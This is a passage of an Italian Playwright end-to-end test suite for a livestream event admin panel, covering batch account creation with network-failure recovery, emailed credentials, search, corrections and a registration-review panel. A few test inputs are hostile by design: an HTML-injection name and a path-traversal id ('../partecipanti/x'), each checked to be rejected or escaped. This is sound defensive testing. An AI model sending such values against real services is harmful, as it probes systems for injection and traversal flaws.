        await aspetta(async () => !(await $('#btn-crea-account').isDisabled()), 8000, 'pulsante acceso');
        const riepilogoPronto = await testo('#riepilogo-anteprima');
        vero(/Tutto pronto: nessun problema da sistemare\. Creare gli account non manda nessuna email\./.test(await testo('#motivo-blocco'))
            && await testo('#btn-crea-account') === 'Crea 37 account e aggiungi 1 persona già registrata' && /0\s*da correggere/.test(riepilogoPronto) && /1\s*esclusa/.test(riepilogoPronto),
            '«Crea gli account» acceso: «' + await testo('#btn-crea-account') + '» — «' + await testo('#motivo-blocco') + '»');

        /* ---------- 4. creazione a gruppi: nessuna email, un account creato nel frattempo, la rete che cade ---------- */
        console.log('\n-- creazione degli account (non parte nessuna email)');
        // un altro gestore, proprio adesso, carica Nicolò D'Angelo (la stessa persona, l'email scritta in maiuscolo) nell'evento di Roma
        const altro = await api('diretta-gestione', { azione: 'crea', idEvento: 'roma-2026', righe: [{ riga: 9, nome: 'Nicolò', cognome: 'D\'Angelo', email: 'N.DAngelo@StudioDAngelo.EXAMPLE', azienda: 'Studio D\'Angelo' }] }, tokGestore);
        vero(altro.stato === 200 && altro.dati.risultati[0].esito === 'creato', 'nel frattempo un altro caricamento (vero) crea l\'account di Nicolò D\'Angelo, con la stessa email scritta in maiuscolo', JSON.stringify(altro.dati));
        const postaPrimaDiCrea = leggiPosta().length;
        guastoCrea.restanti = 3;
        guastoCrea.perse = 1;
        await $('#btn-crea-account').click();
        await confermaDialogo(/Creare 37 account\?.*37 nuovi account: ognuno entrerà con la sua email.*1 persona già registrata aggiunta all'evento, senza un nuovo account e senza una password nuova.*Nessuna email parte adesso: le credenziali partono quando premi «Invia le credenziali» nella scheda Email\./s, 'Crea gli account');
        await $('#btn-riprendi-crea').waitFor({ state: 'visible', timeout: 30000 });
        vero(/Caricamento interrotto al gruppo 2 di 2.*Riprendi.*non si duplicano/.test(await testo('#avanzamento-crea .avanzamento-testo')),
            'la rete cade al secondo gruppo: dopo 3 tentativi la creazione si ferma e propone «Riprendi» (R18) — «' + await testo('#avanzamento-crea .avanzamento-testo') + '»');
        vero(await $('#btn-crea-account').isDisabled() && /Creazione interrotta/.test(await testo('#motivo-blocco')) && !(await $('#btn-annulla-caricamento').isDisabled()),
            'intanto «Crea» resta spento e si può anche annullare');
        vero((await delEvento()).length === 38, 'il primo tentativo del secondo gruppo era arrivato al servizio: nell\'evento ci sono già tutte le 38 persone');
        await $('#btn-riprendi-crea').click();
        await $('#esito-crea').waitFor({ state: 'visible', timeout: 30000 });
        vero(true, '«Riprendi»: la creazione riparte dal gruppo interrotto e si completa');
        vero(JSON.stringify(creaRichieste.map(c => c.righe)) === JSON.stringify([25, 13, 13, 13, 13])
            && JSON.stringify(creaRichieste.map(c => c.esito)) === JSON.stringify(['passata', 'risposta persa', 'non partita', 'non partita', 'passata']),
            'crea a gruppi di 25 (il servizio ne accetta 50): ' + creaRichieste.map(c => c.righe + ' (' + c.esito + ')').join(', '));
        vero(new Set(creaRichieste.slice(1).map(c => c.emails)).size === 1, 'il gruppo interrotto si rimanda identico (stesse righe, stesse email)');
        vero(chiamate('crea').every(c => c.dati.righe.every(r => JSON.stringify(Object.keys(r).sort()) === JSON.stringify(['azienda', 'cognome', 'email', 'nome', 'riga']))),
            'a «crea» vanno riga, nome, cognome, email e azienda: niente nome utente');
        // misurata nella pagina: dall'arrivo della risposta del primo gruppo alla partenza del secondo
        const tempiCrea = await page.evaluate(() => window.__tempiServizio.filter(x => x.azione === 'crea'));
        const pausaGruppi = Math.round(tempiCrea[1].inizio - tempiCrea[0].fine);
        // 300 ms nella pagina; l'orologio finto di Playwright puo' anticipare un timer di qualche ms
        vero(tempiCrea.length === 5 && pausaGruppi >= 290, 'pausa fra un gruppo e l\'altro (' + pausaGruppi + ' ms)');
        const riepilogoCrea = await testo('#esito-crea-riepilogo');
        vero(/23\s*account creati/.test(riepilogoCrea) && /2\s*persone aggiunte all'evento/.test(riepilogoCrea) && /13\s*righe già completate dal tentativo interrotto/.test(riepilogoCrea) && /0\s*errori/.test(riepilogoCrea),
            'riepilogo onesto: 23 creati, 2 aggiunte (Giulia già registrata, Nicolò creato nel frattempo), 13 completate dal tentativo interrotto', riepilogoCrea);
        vero(await testo('#esito-crea-messaggio') === 'Account creati. Nessuna email è partita: le credenziali partono quando premi «Invia le credenziali» nella scheda Email.'
            && await visibile('#btn-vai-email'),
            'dopo la creazione, chiaro: «' + await testo('#esito-crea-messaggio') + '» (con «Vai alla scheda Email»)');
        const diversa = $('#tabella-esito-crea tr.riga-diversa');
        vero(await diversa.count() === 1 && /Nicolò D'Angelo/.test(await diversa.textContent()) && /n\.dangelo@studiodangelo\.example/.test(await diversa.textContent())
            && /creato un account con questa email.*aggiunta all'evento, senza un secondo account/.test(await diversa.textContent()),
            'la riga andata diversamente dall\'anteprima è evidenziata: Nicolò era «nuovo», ma nel frattempo il suo account è nato altrove — aggiunto all\'evento, niente doppione', await diversa.textContent());
        // nessuna email: la posta finta non ha ricevuto niente
        const postaDopoCrea = leggiPosta().slice(postaPrimaDiCrea);
        const kCrea = await statiEmail();
        vero(postaDopoCrea.length === 0 && leggiPosta().every(m => m.a === EMAIL_GESTORE) && kCrea['da inviare'] === 38 && Object.keys(kCrea).length === 1,
            '«Crea gli account» NON manda email: la posta finta è vuota (solo le email del gestore) e le 38 persone sono tutte «da inviare»', JSON.stringify(kCrea) + ' ' + postaDopoCrea.map(m => m.a).join(', '));
        // zero doppioni, contati sul servizio
        const tutti = (await db.collection('partecipanti').get()).docs.map(d => Object.assign({ uid: d.id }, d.data()));
        const indirizzi = (await db.collection('indirizzi').get()).docs;
        const inNapoli = tutti.filter(p => (p.eventi || []).includes(ID));
        const utentiAuth = (await auth.listUsers(1000)).users;
        vero(inNapoli.length === 38 && tutti.length === 39, 'sul servizio: 38 persone nell\'evento, 39 partecipanti in tutto (36 nuovi + Mario e Giulia di Roma + Nicolò)', inNapoli.length + ' / ' + tutti.length);
        vero(new Set(tutti.map(p => p.emailNorm)).size === tutti.length && tutti.every(p => p.email === p.emailNorm && p.email === p.email.trim().toLowerCase()),
            'zero account doppi: un\'email = un account, salvata come si confronta (senza spazi, in minuscolo)');
        vero(indirizzi.length === tutti.length && indirizzi.every(d => tutti.some(p => p.uid === d.data().uid && p.emailNorm === d.id)),
            'ogni indirizzo prenotato (indirizzi/{email}) appartiene a una sola persona, e nessuna prenotazione è rimasta orfana');
        const nicolo = await partecipante('n.dangelo@studiodangelo.example');
        vero(nicolo && JSON.stringify(nicolo.eventi.slice().sort()) === JSON.stringify(['napoli-2026', 'roma-2026']), 'Nicolò: un account solo, con i due eventi');
        vero((await db.collection('nomiUtente').get()).size === 0 && tutti.every(p => !('nomeUtente' in p)), 'nessun nome utente: nomiUtente resta vuota e nessun profilo ha il campo nomeUtente');
        vero(utentiAuth.filter(u => /^p[0-9a-f]{20}$/.test(u.uid)).length === 39 && tutti.every(p => p.authCreato === true),
            'un account di accesso per persona (39), tutti completi');

        /* ---------- 5. elenco e ricerca ---------- */
        console.log('\n-- elenco dei partecipanti');
        await aspetta(async () => (await $('#tabella-partecipanti tbody tr').count()) === 38, 10000, 'elenco con 38 persone');
        const intestazioni = await page.evaluate(() => Array.from(document.querySelectorAll('#tabella-partecipanti thead th')).map(t => t.textContent.trim()).join('|'));
        vero(intestazioni === 'Nome e cognome|Email|Azienda|Account|Email credenziali|Ultimo accesso|Azioni',
            'elenco: 38 persone (36 nuove, Giulia già registrata, Nicolò) e le colonne senza nome utente: ' + intestazioni);
        vero(await page.locator('#tabella-partecipanti .stato-email.stato-da-inviare').count() === 38 && await page.locator('#tabella-partecipanti .origine-modulo').count() === 0,
            'tutte «da inviare»; nessuna «dal modulo del sito» (vengono tutte dal file)');
        const visibiliElenco = () => page.evaluate(() => Array.from(document.querySelectorAll('#tabella-partecipanti tbody tr')).filter(t => !t.hidden).map(t => t.dataset.uid));
        const cerca = async q => { await $('#cerca-partecipanti').fill(q); await pausa(80); return visibiliElenco(); };
        const IVAN = 'ivan.petrov@petrov-trading.example';
        const ANNA = 'annamaria.deluca@deluca-figli.example';
        let v = await cerca(IVAN);
        vero(v.length === 1 && v[0] === await uidDi(IVAN), 'ricerca per email (l\'indirizzo intero)');
        v = await cerca('PETROV-TRADING');
        vero(v.length === 1, 'ricerca per un pezzo dell\'email, in maiuscolo');
        v = await cerca('Ferri Consulting');
        vero(v.length === 1 && v[0] === await uidDi('giulia.ferri@ferri-consulting.example'), 'ricerca per azienda');
        v = await cerca('mario rossi');
        vero(v.length === 2, 'ricerca «mario rossi»: i due omonimi, due persone con email diverse', v.length);
        v = await cerca('Rossi Mario');
        vero(v.length === 2, 'anche con cognome e nome al contrario', v.length);
        v = await cerca('annamariadeluca');
        vero(v.length === 1 && v[0] === await uidDi(ANNA), 'anche attaccato («annamariadeluca» trova Anna Maria De Luca)');
        v = await cerca('NUNEZ');
        vero(v.length === 1, 'ricerca senza accenti e maiuscole («NUNEZ» trova Núñez)');
        await cerca('');
        vero((await visibiliElenco()).length === 38 && /\(38\)/.test(await testo('#conta-partecipanti')), 'ricerca vuota: tutti');

        console.log('\n-- azioni sul partecipante');
        const rp = async email => $('#tabella-partecipanti tr[data-uid="' + await uidDi(email) + '"]');
        await (await rp(IVAN)).locator('button[data-op="reinvia"]').click();
        await confermaDialogo(/Inviare adesso le credenziali.*entrerà con la sua email ivan\.petrov@petrov-trading\.example/s, 'Invia ora');
        await aspetta(async () => (await (await rp(IVAN)).locator('.stato-email').textContent()) === 'inviata', 10000, 'invio');
        vero(/stato-inviata/.test(await (await rp(IVAN)).locator('.stato-email').getAttribute('class')), '«Invia ora»: stato email della persona «inviata», con il colore giusto');
        const letteraIvan = postaPer(IVAN, 'credenziali');
        const pwIvanPrima = letteraIvan.length ? passwordDa(letteraIvan[0]) : '';
        vero(letteraIvan.length === 1 && RE_PASSWORD.test(pwIvanPrima) && letteraIvan[0].testo.indexOf('scrivi la tua email ' + IVAN + ' e questa password: ' + pwIvanPrima) >= 0
            && !/nome utente/i.test(letteraIvan[0].testo + letteraIvan[0].html),
            'nella casella di Ivan: «… scrivi la tua email ' + IVAN + ' e questa password: …» (10 caratteri senza lettere ambigue), nessun nome utente');
        const elenchiPrimaDel409 = chiamate('partecipanti').length;
        await (await rp(IVAN)).locator('button[data-op="reinvia"]').click();
        const avvisoReinvio = await confermaDialogo(/Reinviare le credenziali/);
        vero(/smetterà di funzionare.*entro un'ora/s.test(avvisoReinvio), 'il reinvio avverte che la password attuale smette di funzionare (T9)');
        await aspetta(async () => /meno di un minuto fa/.test(await avvisi()), 10000, '409 del reinvio');
        vero(true, 'reinvio entro un minuto: il servizio risponde 409 e la pagina mostra il suo testo: «' + ((await $('#avvisi .avviso').last().textContent()) || '').trim() + '»');
        vero(postaPer(IVAN, 'credenziali').length === 1, 'e nessuna seconda email è partita');
        /* dopo un 409 la pagina rilegge l'elenco e ridisegna le righe: si
           aspetta che abbia finito, altrimenti il menu «Altro» aperto qui
           sotto verrebbe sostituito (chiuso) a meta' del clic */
        await aspetta(() => chiamate('partecipanti').length > elenchiPrimaDel409, 10000, 'elenco riletto dopo il 409');
        await calma();
        await (await rp(ANNA)).locator('summary').click();
        await (await rp(ANNA)).locator('button[data-op="rigenera"]').click();
        await confermaDialogo(/Nuova password|nuova password/);
        await $('#dialogo-password').waitFor({ state: 'visible', timeout: 5000 });
        const pw = await testo('#password-mostrata');
        vero(RE_PASSWORD.test(pw) && await testo('#password-email') === ANNA && await testo('#password-persona') === 'Anna Maria De Luca',
            'nuova password mostrata una volta, in chiaro solo nella finestra, con l\'email con cui Anna Maria entra');
        const entraAnna = await api('diretta-accesso', { azione: 'entra', email: ' AnnaMaria.DeLuca@Deluca-Figli.example ', password: pw });
        vero(entraAnna.stato === 200 && entraAnna.dati.email === ANNA && !!entraAnna.dati.token && !('nomeUtente' in entraAnna.dati),
            'con quella password Anna Maria entra davvero nella diretta (diretta-accesso «entra» con la sua email, scritta con maiuscole e spazi)');
        await foto('password', true);
        await $('#btn-chiudi-password').click();
        // l'evento 'close' della finestra arriva un attimo dopo il clic: si aspetta
        vero(await aspetta(async () => await testo('#password-mostrata') === '', 3000, 'password tolta').catch(() => false), 'chiusa la finestra, la password sparisce dalla pagina');
        const ROBERTO = 'roberto.moretti@moretti-group.example';
        await (await rp(ROBERTO)).locator('summary').click();
        await (await rp(ROBERTO)).locator('button[data-op="disattiva"]').click();
        await confermaDialogo(/Disattivare l'account/);
        await aspetta(async () => /disattivato/.test(await (await rp(ROBERTO)).getAttribute('class') || ''), 5000, 'disattivato');
        vero(await (await rp(ROBERTO)).locator('button[data-op="riattiva"]').count() === 1, 'disattivato: la riga lo dice e offre «Riattiva»');
        const uidRoberto = await uidDi(ROBERTO);
        const [sessRoberto, authRoberto] = await Promise.all([db.doc('sessioni/' + uidRoberto).get(), auth.getUser(uidRoberto)]);
        vero(sessRoberto.data().stato === 'disattivato' && authRoberto.disabled === true, 'sul servizio: sessioni/{uid} «disattivato» e account di accesso disabilitato');
        const SARA = 'sara.barbieri@barbieri-design.example';
        const uidSara = await uidDi(SARA);
        await (await rp(SARA)).locator('summary').click();
        await (await rp(SARA)).locator('button[data-op="rimuovi-evento"]').click();
        await confermaDialogo(/Togliere da questo evento/);
        await aspetta(async () => (await $('#tabella-partecipanti tbody tr').count()) === 37, 5000, 'tolta');
        const sara = (await db.doc('partecipanti/' + uidSara).get()).data();
        vero(!sara.eventi.includes(ID) && sara.stato === 'attivo', '«Togli da questo evento»: la persona sparisce dall\'elenco dell\'evento, l\'account resta attivo');

        console.log('\n-- correzioni: nome, email cambiata, email già di un\'altra persona');
        const CHLOE = 'chloe.dupont@dupont.invalid';
        await (await rp(CHLOE)).locator('button[data-op="correggi"]').click();
        await $('#dialogo-correggi').waitFor({ state: 'visible' });
        vero(/^Si entra con l'email: se la cambi, Chloé L'Hôtel-Dupont entrerà con quella nuova\. La password resta la stessa\.$/.test(await testo('#correggi-sotto'))
            && await testo('#corr-nota-email') === '' && await page.locator('#dialogo-correggi input[type="radio"]').count() === 0,
            'la finestra di correzione: «' + await testo('#correggi-sotto') + '», nessuna scelta sul nome utente');
        await $('#corr-cognome').fill('Dupont');
        await $('#btn-corr-salva').click();
        await $('#dialogo-correggi').waitFor({ state: 'hidden' });
        await aspetta(async () => /Dati di Chloé Dupont corretti\./.test(await avvisi()), 5000, 'cognome corretto');
        const chloe = await partecipante(CHLOE);
        const corrChloe = chiamate('partecipante').filter(c => c.dati.operazione === 'correggi').pop().dati;
        vero(chloe && chloe.cognome === 'Dupont' && chloe.email === CHLOE && corrChloe.email === CHLOE && !('mantieniNomeUtente' in corrChloe),
            'cognome corretto («Dati di Chloé Dupont corretti.»): stessa email, stesso accesso; alla correzione vanno nome, cognome, azienda ed email');
        // Ivan ha gia' le credenziali: cambiando l'email tornano «da inviare»
        const IVAN2 = 'i.petrov@petrov-trading.example';
        await (await rp(IVAN)).locator('button[data-op="correggi"]').click();
        await $('#dialogo-correggi').waitFor({ state: 'visible' });
        await $('#corr-email').fill('  I.Petrov@Petrov-Trading.example ');
        vero(/erano già partite verso ivan\.petrov@petrov-trading\.example: con la nuova email tornano «da inviare» e le mandi al nuovo indirizzo con «Invia ora»/.test(await testo('#corr-nota-email')),
            'cambiando l\'email di chi ha già le credenziali la finestra avverte prima di salvare: «' + await testo('#corr-nota-email') + '»');
        await $('#btn-corr-salva').click();
        await $('#dialogo-correggi').waitFor({ state: 'hidden' });
        await aspetta(async () => /Email di Иван Петров cambiata/.test(await avvisi()), 5000, 'email cambiata');
        const avvisoEmail = await avvisi();
        vero(/Email di Иван Петров cambiata da ivan\.petrov@petrov-trading\.example a i\.petrov@petrov-trading\.example: adesso entra con la nuova email\. Le credenziali tornano «da inviare»: premi «Invia ora» per mandarle al nuovo indirizzo\./.test(avvisoEmail),
            'l\'avviso dice da che email a che email (emailPrecedente del servizio) e che le credenziali tornano «da inviare»', avvisoEmail);
        const corrIvan = chiamate('partecipante').filter(c => c.dati.operazione === 'correggi').pop().dati;
        const ivanDopo = await partecipante(IVAN2);
        const [indVecchio, indNuovo] = await Promise.all([db.doc('indirizzi/' + IVAN).get(), db.doc('indirizzi/' + IVAN2).get()]);
        vero(corrIvan.email === IVAN2 && ivanDopo && ivanDopo.email === IVAN2 && ivanDopo.invii[ID].stato === 'da inviare' && !!ivanDopo.emailCambiata
            && !indVecchio.exists && indNuovo.exists && indNuovo.data().uid === ivanDopo.uid,
            'sul servizio: l\'email (normalizzata già nella pagina) è cambiata, l\'indirizzo vecchio è libero, il nuovo è di Ivan, credenziali «da inviare»');
        await aspetta(async () => (await (await rp(IVAN2)).locator('.stato-email').textContent()) === 'da inviare'
            && (await (await rp(IVAN2)).locator('.col-email').textContent()) === IVAN2, 5000, 'riga di Ivan aggiornata');
        const conVecchia = await api('diretta-accesso', { azione: 'entra', email: IVAN, password: pwIvanPrima });
        const conNuova = await api('diretta-accesso', { azione: 'entra', email: IVAN2, password: pwIvanPrima });
        vero(conVecchia.stato === 401 && conNuova.stato === 200 && conNuova.dati.email === IVAN2,
            'con l\'email vecchia non si entra più (401); con quella nuova e la password che ha già, sì (l\'account è lo stesso)');
        await (await rp(IVAN2)).locator('button[data-op="reinvia"]').click();
        await confermaDialogo(/Reinviare le credenziali.*i\.petrov@petrov-trading\.example/s, 'Reinvia');
        await aspetta(async () => (await (await rp(IVAN2)).locator('.stato-email').textContent()) === 'inviata', 10000, 'credenziali al nuovo indirizzo');
        const letteraNuova = postaPer(IVAN2, 'credenziali');
        const pwIvanNuova = letteraNuova.length ? passwordDa(letteraNuova[0]) : '';
        vero(letteraNuova.length === 1 && RE_PASSWORD.test(pwIvanNuova) && letteraNuova[0].testo.indexOf('scrivi la tua email ' + IVAN2 + ' e questa password: ' + pwIvanNuova) >= 0
            && postaPer(IVAN, 'credenziali').length === 1,
            '«Reinvia»: le credenziali partono al nuovo indirizzo, con la nuova email e una password nuova; al vecchio indirizzo niente di più');
        // un'email che e' gia' di un'altra persona: 409 mostrato nella finestra
        await (await rp('elena.ricci@ricci-partners.example')).locator('button[data-op="correggi"]').click();
        await $('#corr-email').fill('giulia.ferri@ferri-consulting.example');
        await $('#btn-corr-salva').click();
        await aspetta(async () => /appartiene già a un'altra persona/.test(await testo('#msg-correggi')), 5000, '409');
        vero(await $('#corr-email').getAttribute('aria-invalid') === 'true' && (await partecipante('elena.ricci@ricci-partners.example')) !== null,
            'email già usata da un\'altra persona: il 409 «email-occupata» del servizio è mostrato nella finestra, niente salvato — «' + await testo('#msg-correggi') + '»');
        await $('#btn-corr-annulla').click();
        // gli avvisi brevi (in basso a destra) se ne vanno da soli: la regia si guarda senza niente sopra
        await aspetta(async () => (await $('#avvisi .avviso').count()) === 0, 15000, 'avvisi spariti');

        /* ---------- 5 bis. iscrizioni dal modulo da verificare ---------- */
        console.log('\n-- iscrizioni dal modulo da verificare');
        vero(await $('#riquadro-da-verificare').isHidden(), 'senza iscrizioni da verificare il riquadro non si vede');
        /* Le righe come le scrive il servizio quando il modulo del sito porta
           una persona che la diretta non puo' iscrivere da sola
           (lib/diretta-iscrizione.js, segnaDaVerificare: la stessa funzione):
           l'email di un'altra persona (con un nome che prova a essere HTML) e
           un indirizzo che la diretta non accetta; piu' una di un altro evento,
           che qui non si deve vedere. Il percorso dal modulo vero alla riga lo
           prova iscrizioni.prova.js. */
        const IS = require(path.join(RADICE, 'email-service/lib/diretta-iscrizione'));
        const ctxDV = { db: db, Timestamp: admin.firestore.Timestamp, FieldValue: admin.firestore.FieldValue, adesso: () => Date.now() };
        const idCondivisa = await IS.segnaDaVerificare(ctxDV, {
            idEvento: ID, motivo: 'email-condivisa', nome: 'Luigi', cognome: '<b>Secondo</b>', azienda: 'Studio Esempio', email: 'info@studio-esempio.example', esistente: 'Carla Prima'
        });
        await pausa(20);
        const idNonValida = await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'email-non-valida', nome: 'José', cognome: 'García', azienda: '', email: 'josé.garcia@esempio.example' });
        await IS.segnaDaVerificare(ctxDV, { idEvento: 'roma-2026', motivo: 'email-non-valida', nome: 'Altro', cognome: 'Evento', azienda: '', email: 'altro.@evento.example' });
        await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'email-condivisa', nome: 'Luigi', cognome: '<b>Secondo</b>', azienda: 'Studio Esempio', email: 'info@studio-esempio.example', esistente: 'Carla Prima' });
        await $('#btn-aggiorna-partecipanti').click();
        await aspetta(async () => (await $('#tabella-da-verificare tbody tr').count()) === 2 && await visibile('#riquadro-da-verificare'), 10000, 'righe da verificare');
        const righeDV = await page.evaluate(() => Array.from(document.querySelectorAll('#tabella-da-verificare tbody tr')).map(t => ({ id: t.dataset.id, motivo: t.dataset.motivo, testo: t.textContent })));
        vero(/\(2\)/.test(await testo('#conta-da-verificare')) && righeDV[0].id === idCondivisa && righeDV[1].id === idNonValida,
            'il riquadro «Iscrizioni dal modulo da verificare» compare nella scheda Partecipanti con le 2 righe dell\'evento (la piu\' recente in alto; quella di Roma no)');
        vero(/Luigi <b>Secondo<\/b>/.test(righeDV[0].testo) && await page.locator('#tabella-da-verificare b').count() === 0
            && /info@studio-esempio\.example/.test(righeDV[0].testo) && /Email di un'altra persona/.test(righeDV[0].testo)
            && /Con questa email c'è già l'account di Carla Prima/.test(righeDV[0].testo) && /Si è iscritta 2 volte\./.test(righeDV[0].testo),
        'email condivisa: chi, l\'indirizzo, il perché (l\'account di Carla Prima), quante volte; il nome «<b>…» resta testo', righeDV[0].testo);
        vero(/josé\.garcia@esempio\.example/.test(righeDV[1].testo) && /Email non accettata/.test(righeDV[1].testo) && /La diretta non accetta questo indirizzo/.test(righeDV[1].testo),
            'email non valida per la diretta: l\'indirizzo come l\'ha scritto la persona e il perché', righeDV[1].testo);
        await foto('da-verificare');
        const senzaToken = await api('diretta-gestione', { azione: 'da-verificare', idEvento: ID });
        const idStrano = await api('diretta-gestione', { azione: 'da-verificare-archivia', idEvento: ID, id: '../partecipanti/x' }, tokGestore);
        const altroEvento = await api('diretta-gestione', { azione: 'da-verificare-archivia', idEvento: 'roma-2026', id: idCondivisa }, tokGestore);
        vero(senzaToken.stato === 401 && idStrano.stato === 400 && altroEvento.stato === 404,
            'le azioni nuove sono protette come le altre: senza token 401, un id non valido 400, la riga di un altro evento 404');
        await $('#tabella-da-verificare tr[data-id="' + idCondivisa + '"] button[data-op="archivia"]').click();
        await aspetta(async () => (await $('#tabella-da-verificare tbody tr').count()) === 1, 5000, 'riga segnata come vista');
        const docVista = (await db.collection('daVerificare').doc(idCondivisa).get()).data();
        vero(/\(1\)/.test(await testo('#conta-da-verificare')) && /segnata come vista/.test(await avvisi()) && docVista.archiviato === true && docVista.archiviatoDa === EMAIL_GESTORE,
            '«Segna come vista»: la riga sparisce, il conto scende a 1; sul servizio resta archiviata, con chi l\'ha segnata');
        await $('#tabella-da-verificare tr[data-id="' + idNonValida + '"] button[data-op="archivia"]').click();
        await aspetta(async () => await $('#riquadro-da-verificare').isHidden(), 5000, 'riquadro vuoto');
        vero(true, 'segnata anche l\'ultima: il riquadro sparisce');
        await $('#btn-aggiorna-partecipanti').click();
        await calma();
        vero(await $('#riquadro-da-verificare').isHidden(), 'riletto l\'elenco, le righe viste non tornano');
        /* Le righe che arrivano dal collegamento della conferma (origine
           'sito'): chi ha annullato (gia' fuori dall'evento), chi ha
           annullato ma con la sua email nell'evento c'e' un'altra persona
           (non toccata), chi ha riattivato a interruttore spento. Il percorso
           vero (dal modulo alla riga) lo prova iscrizioni.prova.js. */
        const idAnnullata = await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'annullata-dal-sito', origine: 'sito', nome: 'Rita', cognome: 'Ritiro', azienda: 'Ritiro srl', email: 'rita.ritiro@esempio.example' });
        await pausa(20);
        const idAltra = await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'annullata-dal-sito', origine: 'sito', nome: 'Luca', cognome: 'Collega', azienda: '', email: 'info@studio-esempio.example', esistente: 'Carla Prima' });
        await pausa(20);
        const idRiattivata = await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'riattivata-dal-sito', origine: 'sito', nome: 'Nino', cognome: 'Ritorno', azienda: '', email: 'nino.ritorno@esempio.example' });
        await IS.segnaDaVerificare(ctxDV, { idEvento: ID, motivo: 'riattivata-dal-sito', origine: 'sito', nome: 'Nino', cognome: 'Ritorno', azienda: '', email: 'nino.ritorno@esempio.example' });
        await $('#btn-aggiorna-partecipanti').click();
        await aspetta(async () => (await $('#tabella-da-verificare tbody tr').count()) === 3 && await visibile('#riquadro-da-verificare'), 10000, 'righe dal sito');
        const righeSito = await page.evaluate(() => Array.from(document.querySelectorAll('#tabella-da-verificare tbody tr')).map(t => ({
            id: t.dataset.id, motivo: t.dataset.motivo, testo: t.textContent, etichetta: (t.querySelector('.etichetta-esito') || {}).className || ''
        })));
        const perId = id => righeSito.find(r => r.id === id) || { testo: '', etichetta: '' };
        vero(righeSito.map(r => r.id).join() === [idRiattivata, idAltra, idAnnullata].join() && /Che cosa è successo/.test(await testo('#tabella-da-verificare thead')),
            'tre righe dal sito, la più recente in alto; la colonna del motivo si chiama «Che cosa è successo»');
        vero(/Iscrizione annullata dal sito/.test(perId(idAnnullata).testo) && /annullata-dal-sito/.test(perId(idAnnullata).etichetta)
            && /l'abbiamo tolta da questo evento \(non vede più la diretta; le credenziali non ancora partite sono cancellate\)\. Non devi fare niente/.test(perId(idAnnullata).testo),
        'annullata dal sito: «Iscrizione annullata dal sito», già tolta dall\'evento, non c\'è niente da fare', perId(idAnnullata).testo);
        vero(/Iscrizione annullata dal sito/.test(perId(idAltra).testo) && /nell'evento c'è l'account di Carla Prima: non l'abbiamo toccato\. Se è la stessa persona, toglila tu dall'evento\./.test(perId(idAltra).testo),
            'annullata dal sito ma con l\'email di un\'altra persona nell\'evento: non toccata, e il nome sull\'account', perId(idAltra).testo);
        vero(/Annullamento ritirato/.test(perId(idRiattivata).testo) && /riattivata-dal-sito/.test(perId(idRiattivata).etichetta)
            && /l'invio automatico della password è spento: non l'abbiamo rimessa nell'evento\. Se deve seguire la diretta, caricala con il file\./.test(perId(idRiattivata).testo)
            && /L'ha riattivata 2 volte\./.test(perId(idRiattivata).testo),
        'riattivata con l\'invio automatico spento: «Annullamento ritirato», non è rientrata da sola (e quante volte)', perId(idRiattivata).testo);
        vero(/annullato/.test((await testo('#riquadro-da-verificare .riquadro-sotto')).replace(/\s+/g, ' ')), 'la spiegazione del riquadro dice anche degli annullamenti');
        await foto('da-verificare-dal-sito');
        for (const id of [idAnnullata, idAltra, idRiattivata]) {
            await $('#tabella-da-verificare tr[data-id="' + id + '"] button[data-op="archivia"]').click();
            await aspetta(async () => (await $('#tabella-da-verificare tr[data-id="' + id + '"]').count()) === 0, 5000, 'riga vista');
        }
        vero(await $('#riquadro-da-verificare').isHidden() && (await db.collection('daVerificare').doc(idAnnullata).get()).data().archiviato === true,
            'segnate come viste: il riquadro sparisce, le righe restano nel servizio (archiviate)');
        await aspetta(async () => (await $('#avvisi .avviso').count()) === 0, 15000, 'avvisi spariti');

        /* ---------- 6. regia ---------- */
        console.log('\n-- regia');
        /* I segnali di presenza li scrive la pagina dei partecipanti, uno al
           minuto: qui si scrivono direttamente (firebase-admin) per 31 persone. */
        const persone = (await delEvento()).filter(p => p.stato === 'attivo').sort((a, b) => a.emailNorm.localeCompare(b.emailNorm));
        const segnala = async (elenco, campi) => {
            const lotto = db.batch();
            elenco.forEach(p => lotto.set(db.doc('presenze/' + ID + '_' + p.uid), Object.assign({
                uid: p.uid, idEvento: ID, primo: Ts.now(), ultimo: Ts.now(), secondi: 0, collegamenti: 1, sessione: 'prova-' + p.uid.slice(1, 9)
            }, typeof campi === 'function' ? campi(p) : (campi || {}))));
            await lotto.commit();
        };
        const docPubblico = async () => (await db.doc('eventi/' + ID).get()).data();
        const docRiservato = async () => (await db.doc('eventiRiservati/' + ID).get()).data();
        // nascosto con l'attributo hidden (anche dentro una parte chiusa, dove isHidden direbbe sempre si')
        const nascosto = sel => $(sel).evaluate(n => n.hidden);
        const aperto = sel => $(sel).evaluate(n => n.open);
        await segnala(persone.slice(0, 31));
        await page.click('[data-scheda="regia"]');
        await aspetta(async () => await testo('#num-connessi') === '31', 10000, 'collegati');
        vero(await testo('#regia-stato-testo') === 'IN ATTESA', 'stato grande: IN ATTESA');
        vero(/su 37 iscritti/.test(await testo('#connessi-dettaglio')), 'contatore dei collegati dal servizio: 31, accanto agli iscritti di adesso (' + await testo('#connessi-dettaglio') + ')');
        vero(await testo('#regia-tipo-player') === 'Player Azoto' && await $('#regia-tipo-player').getAttribute('data-tipo') === 'azoto'
            && !(await nascosto('#btn-passa-flusso')) && await $('#btn-passa-flusso').isEnabled() && await nascosto('#btn-passa-azoto'),
            'regia: «Player in uso per tutti: Player Azoto»; c\'è solo «Passa al flusso diretto per tutti», acceso perché il flusso è salvato');
        vero(await aperto('#regia-blocco-azoto') && !(await aperto('#regia-blocco-flusso'))
            && await testo('#regia-azoto-attuale') === AZOTO_29 && await $('#btn-guarda-azoto').isVisible() && await $('#regia-azoto').inputValue() === AZOTO_29,
            'aperta la parte del player Azoto (l\'indirizzo salvato, «Guarda»), chiusa quella del flusso diretto');
        vero(/^L'indirizzo del player Azoto arriva ai partecipanti solo mentre la diretta è in onda, e solo dopo l'accesso/.test(await testo('#regia-video-pubblico'))
            && /^Il flusso diretto è pronto \(webtv\.prova\.test\/…\/master\.m3u8\)/.test(await testo('#regia-player-aiuto')),
            'la regia dice che il player arriva ai partecipanti solo in onda e dopo l\'accesso, e che il flusso diretto è pronto: «' + await testo('#regia-player-aiuto') + '»');
